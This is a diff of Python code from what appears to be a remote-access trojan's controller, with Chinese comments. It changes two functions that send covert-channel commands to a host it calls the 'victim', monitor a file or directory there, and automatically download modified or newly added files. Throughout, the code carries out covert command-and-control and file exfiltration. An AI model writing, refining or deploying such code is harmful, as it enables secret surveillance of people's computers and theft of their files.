@@ -356,56 +356,33 @@ def cmd_monitor_file(comm: Commander):
         try:
             while True:
                 data = comm.recv_covert_message()
-                print(f"[DEBUG][Commander] recv_covert_message raw: {data!r}")
                 if data is None:
                     continue
 
-                # —— 1. 二进制文件推送（文件内容直接发送的情况） ——
-                if data.startswith(b"FILE_TRANSFER:"):
-                    parts = data.split(b":", 2)
-                    if len(parts) == 3:
-                        filename = parts[1].decode()
-                        file_bytes = parts[2]
-                        print(f"[DEBUG][Commander] Received FILE_TRANSFER for {filename}, {len(file_bytes)} bytes")
-                        # 保存文件到当前目录
-                        with open(filename, "wb") as out:
-                            out.write(file_bytes)
-                        print(f"[*] 已接收并保存文件：{filename}")
-                    else:
-                        print("[!] 文件传输消息格式错误")
-                    continue
-
-                # —— 2. JSON 日志推送（文件变动通知） ——
+                # 先尝试 JSON 解析
                 try:
                     line = data.decode('utf-8', errors='ignore').strip()
-                    print(f"[DEBUG][Commander] JSON line: {line}")
                     msg = json.loads(line)
-                    print(f"[DEBUG][Commander] Parsed JSON msg: {msg}")
-                except Exception as e:
-                    print(f"[DEBUG][Commander] JSON parse error: {e}")
+                except Exception:
+                    # 如果不是 JSON，就跳过（也可以处理 FILE_TRANSFER）
                     continue
 
-                ts = msg.get('timestamp', '')
-                typ = msg.get('type', '')
+                ts   = msg.get('timestamp', '')
+                typ  = msg.get('type', '')
                 path = msg.get('path', '')
-                content = msg.get('content', '')
 
-                # 打印关键信息
-                print(f"[{ts}] {typ} | {path}")
-                if content:
-                    print(content)
-                # **新功能**：输出变动文件路径并下载文件
-                if path:
-                    print(f"[*] 变动文件路径：{path}")
+                # 只对真正的“文件修改”事件触发下载
+                if typ == "MON_FILE_MODIFIED" and path:
+                    print(f"[{ts}] 文件被修改：{path}")
+                    # 下载到本地
                     try:
                         local_name = os.path.basename(path)
-                        success = comm.download_file_with_debug(path, local_name)
-                        if not success:
-                            print(f"[!] 下载文件失败：{path}")
+                        ok = comm.download_file_with_debug(path, local_name)
+                        if not ok:
+                            print(f"[!] 下载失败：{path}")
                     except Exception as e:
-                        print(f"[!] 下载文件 {path} 时发生异常：{e}")
-                print("-" * 40)
-                # 将原始日志内容追加写入日志文件
+                        print(f"[!] 下载异常：{e}")
+                # 记录日志
                 logfile.write(line + "\n")
                 logfile.flush()
 
@@ -415,49 +392,50 @@ def cmd_monitor_file(comm: Commander):
 
 
 
+
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
     date_str = datetime.now().strftime("%Y-%m-%d")
     log_filename = f"{date_str}.log"
-    print(f"[*] 开始监控目录：{dir_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
+    print(f"[*] 开始监控目录：{dir_path}（仅根目录文件，不含子目录），日志：{log_filename}")
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
     with open(log_filename, "a", encoding="utf-8") as logfile:
         try:
             while True:
                 data = comm.recv_covert_message()
-                if not data:
-                    continue  # 超时重试
-                try:
-                    msg = json.loads(data.decode(errors="ignore"))
-                except json.JSONDecodeError:
-                    # 解析失败就忽略
+                if data is None:
                     continue
 
-                # 打印关键信息
-                print(f"[{msg['timestamp']}] 事件类型: {msg['type']} | 文件: {msg.get('filename', '')} | 路径: {msg['path']}")
-                if 'content' in msg:
-                    print(msg['content'])
-                # **新功能**：输出变动文件路径并下载文件
-                if 'path' in msg:
-                    changed_path = msg['path']
-                    print(f"[*] 变动文件路径：{changed_path}")
-                    try:
-                        local_name = os.path.basename(changed_path)
-                        success = comm.download_file_with_debug(changed_path, local_name)
-                        if not success:
-                            print(f"[!] 下载文件失败：{changed_path}")
-                    except Exception as e:
-                        print(f"[!] 下载文件 {changed_path} 时发生异常：{e}")
-                print("-" * 40)
+                try:
+                    msg = json.loads(data.decode('utf-8', errors='ignore'))
+                except Exception:
+                    continue
 
-                # 追加写入日志文件
+                ts       = msg.get('timestamp', '')
+                typ      = msg.get('type', '')
+                basepath = msg.get('path', '')      # 目录路径
+                fname    = msg.get('filename', '')  # 新增或删除的文件名
+
+                # 只对“新增文件”事件触发下载
+                if typ == "MON_DIR_ADDED" and basepath and fname:
+                    full_path = os.path.join(basepath, fname)
+                    print(f"[{ts}] 目录中新文件：{full_path}")
+                    try:
+                        local_name = os.path.basename(full_path)
+                        ok = comm.download_file_with_debug(full_path, local_name)
+                        if not ok:
+                            print(f"[!] 下载失败：{full_path}")
+                    except Exception as e:
+                        print(f"[!] 下载异常：{e}")
+                # 记录日志
                 logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
                 logfile.flush()
 
         except KeyboardInterrupt:
             print("\n[*] 停止目录监控。")
             comm.send_covert_message(b"CMD_STOP_MON_DIR")
+
 
 
 def cmd_run_program(comm: Commander):
